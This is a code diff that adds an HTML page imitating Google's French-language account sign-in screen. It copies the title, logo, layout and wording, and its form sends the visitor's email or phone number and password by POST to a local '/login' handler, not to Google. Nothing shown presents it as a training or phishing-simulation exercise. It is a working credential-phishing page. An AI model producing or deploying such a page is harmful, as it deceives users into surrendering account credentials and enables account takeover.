@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion - Comptes Google</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 48px 40px 36px;
+            width: 100%;
+            max-width: 448px;
+            text-align: center;
+        }
+        .logo {
+            margin-bottom: 24px;
+        }
+        .logo img {
+            width: 75px;
+            height: auto;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 16px;
+            color: #202124;
+        }
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px 15px;
+            margin-bottom: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        button {
+            width: 100%;
+            padding: 10px 24px;
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        button:hover {
+            background-color: #1565c0;
+        }
+        .options {
+            margin-top: 24px;
+            font-size: 14px;
+        }
+        .options a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        .options a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+        <img src="/images/logos/google-logo.png" alt="Google Logo">        </div>
+        <h1>Connexion</h1>
+        <p class="text-base text-gray-700 mb-6">Utilisez votre compte Google</p>
+        <form action="/login" method="POST">
+            <input type="email" name="email" placeholder="Adresse e-mail ou numéro de téléphone" required>
+            <input type="password" name="password" placeholder="Mot de passe" required>
+            <button type="submit">Suivant</button>
+        </form>
+        <div class="options">
+            <a href="#">Mot de passe oublié ?</a>
+            <br>
+            <a href="#">Créer un compte</a>
+        </div>
+    </div>
+</body>
+</html>
